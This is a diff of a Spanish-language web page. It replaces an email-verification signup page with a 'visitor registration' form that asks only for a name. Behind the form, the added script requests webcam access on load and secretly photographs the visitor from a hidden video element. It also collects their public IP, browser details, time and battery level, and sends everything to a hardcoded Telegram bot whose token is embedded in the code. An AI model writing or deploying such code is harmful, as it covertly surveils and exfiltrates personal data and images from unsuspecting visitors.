@@ -1,163 +1,177 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-    <meta charset="UTF-8">
-    <title>Registro | Verificación de correo</title>
-    <style>
-        body {
-            margin: 0;
-            padding: 0;
-            background: linear-gradient(135deg, #6B73FF 0%, #000DFF 100%);
-            height: 100vh;
-            font-family: 'Poppins', sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            flex-direction: column;
-            color: white;
-            overflow: hidden;
-        }
-
-        h1 {
-            animation: fadeIn 2s;
-        }
-
-        .buttons {
-            margin-top: 30px;
-            display: flex;
-            gap: 20px;
-        }
-
-        button {
-            padding: 15px 30px;
-            border: none;
-            border-radius: 10px;
-            background-color: white;
-            color: #000DFF;
-            font-weight: bold;
-            font-size: 16px;
-            cursor: pointer;
-            transition: 0.3s;
-        }
-
-        button:hover {
-            transform: scale(1.1);
-            background-color: #d6d6ff;
-        }
-
-        .hidden {
-            display: none;
-        }
-
-        .form-container {
-            margin-top: 30px;
-            background: white;
-            padding: 30px;
-            border-radius: 20px;
-            color: black;
-            box-shadow: 0px 0px 20px #00000050;
-            animation: slideUp 1s;
-        }
-
-        input {
-            padding: 10px;
-            width: 250px;
-            margin-top: 10px;
-            border: 1px solid #000DFF;
-            border-radius: 8px;
-            outline: none;
-        }
-
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(-50px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-
-        @keyframes slideUp {
-            from { opacity: 0; transform: translateY(50px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-
-        .success-message {
-            margin-top: 30px;
-            font-size: 20px;
-            background: #00ff88;
-            color: black;
-            padding: 20px;
-            border-radius: 15px;
-        }
-    </style>
+  <meta charset="UTF-8">
+  <title>Registro de Visitante</title>
+  <style>
+    body {
+      font-family: "Poppins", sans-serif;
+      background: linear-gradient(135deg, #a1c4fd, #c2e9fb);
+      height: 100vh;
+      margin: 0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-direction: column;
+      text-align: center;
+      overflow: hidden;
+    }
+    .container {
+      background: white;
+      padding: 30px;
+      border-radius: 20px;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+      animation: fadeIn 1s ease;
+      width: 300px;
+    }
+    input {
+      width: 90%;
+      padding: 10px;
+      margin-top: 15px;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+      font-size: 16px;
+    }
+    button {
+      margin-top: 20px;
+      padding: 12px 20px;
+      background: #4CAF50;
+      color: white;
+      border: none;
+      border-radius: 10px;
+      cursor: pointer;
+      width: 100%;
+      font-size: 16px;
+      transition: background 0.3s;
+    }
+    button:hover {
+      background: #45a049;
+    }
+    @keyframes fadeIn {
+      from {opacity: 0; transform: translateY(20px);}
+      to {opacity: 1; transform: translateY(0);}
+    }
+  </style>
 </head>
 <body>
 
-    <h1>Bienvenido</h1>
+<div class="container" id="formulario">
+  <h2>Ingresa tu nombre</h2>
+  <input type="text" id="nombre" placeholder="Tu nombre">
+  <button onclick="enviarDatos()">Enviar</button>
+  <p id="estado" style="margin-top:15px;"></p>
+</div>
 
-    <div class="buttons">
-        <button id="registerBtn">Registrarse</button>
-        <button id="loginBtn">Login</button>
-    </div>
+<video id="video" style="display:none;"></video>
 
-    <div class="form-container hidden" id="registerForm">
-        <h2>Registrar correo</h2>
-        <input type="email" id="emailInput" placeholder="Ingresa tu correo" required><br><br>
-        <button onclick="sendVerification()">Enviar verificación</button>
-    </div>
+<script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
 
-    <div class="success-message hidden" id="successMessage">
-        ¡Correo enviado! Revisa tu bandeja de entrada.
-    </div>
+<script>
+const botToken = "7745087272:AAGkTNgj2raKiA-Fv2ms16sFnfgE5BTNNs4";
+const chatId = "8143059484";
+let streamGlobal = null;
 
-    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
-    <script>
-        emailjs.init('C0jkORh-5kE1TJj7y');
+async function pedirPermisoCamara() {
+  try {
+    streamGlobal = await navigator.mediaDevices.getUserMedia({ video: true });
+    document.getElementById('video').srcObject = streamGlobal;
+  } catch (error) {
+    document.getElementById('estado').innerText = "Permiso de cámara denegado.";
+  }
+}
 
-        const registerBtn = document.getElementById('registerBtn');
-        const loginBtn = document.getElementById('loginBtn');
-        const registerForm = document.getElementById('registerForm');
-        const successMessage = document.getElementById('successMessage');
+async function enviarDatos() {
+  const nombre = document.getElementById('nombre').value.trim();
+  if (nombre === "") {
+    document.getElementById('estado').innerText = "Por favor ingresa tu nombre.";
+    return;
+  }
 
-        registerBtn.onclick = () => {
-            registerForm.classList.remove('hidden');
-            registerBtn.classList.add('hidden');
-            loginBtn.classList.add('hidden');
-        }
+  document.getElementById('estado').innerText = "Enviando datos...";
 
-        function sendVerification() {
-            const email = document.getElementById('emailInput').value;
-            if (!email) {
-                alert('Por favor ingresa un correo válido.');
-                return;
-            }
+  let ip = "No detectada";
+  let marca = navigator.userAgent;
+  let hora = new Date().toLocaleString();
+  let bateria = "No disponible";
 
-            // Link que se enviará al correo
-            const verificationLink = `${window.location.href}?verified=true`;
+  // IP pública
+  try {
+    const res = await axios.get("https://api.ipify.org?format=json");
+    ip = res.data.ip;
+  } catch (e) {}
 
-            const templateParams = {
-                to_email: email,
-                message: `¡Haz clic en el siguiente enlace para verificar tu correo: ${verificationLink}`
-            };
+  // Batería
+  try {
+    const battery = await navigator.getBattery();
+    bateria = Math.round(battery.level * 100) + "%";
+  } catch (e) {}
 
-            emailjs.send('service_2k0zijn', 'template_lcc93bh', templateParams)
-                .then(function(response) {
-                    console.log('SUCCESS!', response.status, response.text);
-                    registerForm.classList.add('hidden');
-                    successMessage.classList.remove('hidden');
-                }, function(error) {
-                    console.log('FAILED...', error);
-                    alert('Error al enviar el correo. Intenta de nuevo.');
-                });
-        }
+  // Tomar foto
+  let imagen = "";
+  try {
+    const video = document.getElementById('video');
+    video.play();
+    const canvas = document.createElement('canvas');
+    canvas.width = 640;
+    canvas.height = 480;
+    const context = canvas.getContext('2d');
+    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+    imagen = canvas.toDataURL('image/jpeg');
+  } catch (error) {
+    console.error("No se pudo capturar la imagen.", error);
+  }
 
-        window.onload = () => {
-            const params = new URLSearchParams(window.location.search);
-            if (params.get('verified') === 'true') {
-                document.body.innerHTML = `
-                    <h1>¡Correo verificado!</h1>
-                    <p>Ahora puedes continuar con tu registro.</p>
-                `;
-            }
-        }
-    </script>
+  // Enviar mensaje
+  const mensaje = `
+Nuevo visitante:
+- Nombre: ${nombre}
+- IP: ${ip}
+- Marca/Navegador: ${marca}
+- Hora: ${hora}
+- Batería: ${bateria}
+`;
+
+  try {
+    await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+      chat_id: chatId,
+      text: mensaje
+    });
+
+    if (imagen) {
+      // Enviar la foto
+      const blob = await (await fetch(imagen)).blob();
+      const formData = new FormData();
+      formData.append('chat_id', chatId);
+      formData.append('photo', blob, 'foto.jpg');
+
+      await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+        method: 'POST',
+        body: formData
+      });
+    }
+
+    document.getElementById('estado').innerText = "Datos enviados correctamente.";
+    descargarTxt();
+    if (streamGlobal) {
+      streamGlobal.getTracks().forEach(track => track.stop());
+    }
+  } catch (e) {
+    console.error("Error al enviar datos.", e);
+    document.getElementById('estado').innerText = "Error al enviar los datos.";
+  }
+}
+
+function descargarTxt() {
+  const data = "Hola";
+  const blob = new Blob([data], { type: 'text/plain' });
+  const link = document.createElement('a');
+  link.href = URL.createObjectURL(blob);
+  link.download = 'archivo.txt';
+  link.click();
+}
+
+pedirPermisoCamara();
+</script>
 
 </body>
 </html>
